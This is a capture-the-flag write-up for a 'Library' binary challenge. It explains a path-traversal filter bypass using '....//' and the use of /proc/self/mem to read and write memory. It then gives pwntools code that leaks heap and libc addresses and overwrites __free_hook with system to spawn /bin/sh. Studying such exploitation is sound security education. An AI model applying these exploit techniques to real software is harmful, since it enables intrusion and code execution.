# Library Writeup

## Reversing

The binary is an application that gives the user options for opening, reading, and editing files (except flag.txt).
When opening a file, it appends the name we provide to `novels/` and opens that file, and stores its `fd` globally, for use by `read_novel()`, `edit_novel()` and `publish_novel()`.
When reading or editing files, it prompts for an offset and size, then prints the text starting at that offset and of that length, and if editing it prompts for a string of the same size with, then edits using [pwrite](https://man7.org/linux/man-pages/man3/pwrite.3p.html).

## Path traversal

When opening a file, the program copies the filename to the end of `novels/` byte by byte.
It attempts to avoid path traversal by skipping each instance of `../` it finds, however this can be bypassed using `....//`.
It will only find the `../` nested in between `..` and `/`, and skips that, but still copies the preceding `..` and following `/`, resulting in a `../`.

We can't use this to open the flag file, as there's a special case for if the path contains `flag` (and even if there wasn't, the `flag.txt` is only readable, so opening with `O_RDWR` would fail).

But we can instead open [/proc/self/mem](https://man7.org/linux/man-pages/man5/proc_pid_mem.5.html).
This file gives a view of the current process' memory, which can be written to and read from using `write` and `read` for example.
In our case, it uses `pwrite` and `pread`, which also specified the offset to use in the file operation, and in the case of `/proc/self/mem`, this refers to a memory address.

## Handlers

```py
send_choice = lambda c: p.sendlineafter(b"> ", str(c).encode())

def open_novel(path):
    send_choice(1)
    p.sendlineafter(b"Novel: ", path)

def read_novel(offset, size):
    send_choice(2)
    p.sendlineafter(b"Enter offset and size: ", f"{offset} {size}".encode())
    return p.recvuntil(b"\n1. Open novel", drop=True)

def edit_novel(offset, size, data):
    send_choice(3)
    p.sendlineafter(b"Enter offset and size: ", f"{offset} {size}".encode())
    assert len(data) < size
    assert b"\n" not in data
    p.sendlineafter(b"Enter edit: ", data)
```

## Leaking

### Heap

We have a problem that PIE and ASLR will be enabled, so we don't have any addresses we can use at the moment.
We can get around this initially by using an invalid address, such as `0`, and while this will cause `pread` to fail with an error, it won't crash the program, and it won't check for an error, so it will continue as normal.

This means that when it `malloc`s a chunk in `_read_novel`, then uses `pread` (and fails), it will leave that chunk uninitialised (and since it's not `calloc`, this isn't necessarily just nulls).
We can use this for a leak as follows:

* Free 2 chunks of the same size within tcache using `edit_novel()`.
* Now the chunk at the top of tcache has its `fd` pointing to the next chunk on the heap.
* Allocating this chunk with `read_novel()` keeps the `fd` field intact, and prints it to us for a heap leak.

```py
open_novel(b"....//"*18 + b"/proc/self/mem")

edit_novel(0, 0x100, b"aaaa")
heap_leak = u64(read_novel(0, 0x100) + b"\x00\x00")
log.info("heap leak: %#x", heap_leak)
```

### Libc

To leak libc, we'd need to leak the `fd` pointer of an unsortedbin chunk, but if we freed any of those, they would just get consolidated into the top chunk, and not leave behind any pointers.

We can get around this by now using our arb write into the heap to change the chunk size of a chunk about to be freed to larger than (or equal to ) `0x420` (ensuring there's a padding chunk afterwards to prevent consolidation with top chunk).
Then we can allocate this chunk back with `read_novel()` as before for libc leak.

```py
read_novel(0, 0x18)     # target
read_novel(0, 0x408)    # padding
read_novel(0, 0x28)     # top chunk guard

edit_novel(heap_leak + 0x108, 0x100, p16(0x431))

read_novel(0, 0x18)
libc_leak = u64(read_novel(0, 0x428) + b"\x00\x00")
log.info("libc leak: %#x", libc_leak)

libc.address = libc_leak - (libc.sym.main_arena+96)
log.info("libc: %#x", libc.address)
```

## Exploitation

Now we have an arbitrary write & read primitive into libc and heap.
There are many ways to utilise this, but one example is `__free_hook`.
This is a function pointer that gets called when `free` is called, with the first argument being the chunk being freed.
A common way to abuse this is writing `&system` to `__free_hook` and freeing a chunk starting with a command like `/bin/sh`.
We can do this in one shot using `edit_novel()`:
```py
cmd = b"/bin/sh #"
edit_novel(libc.sym.__free_hook-len(cmd), 0x100, cmd+p64(libc.sym.system))
p.interactive()
```
1. `pwrite` writes our data to the target address, setting `__free_hook = &system` (the command will be right before, but this is irrelevant).
2. The chunk containing our input gets freed, calling `system` on it. The command is `/bin/sh #`, where the `#` comments out the junk right afterwards (i.e. the pointer to `system`).

## Solve script

In [solve.py](solve.py)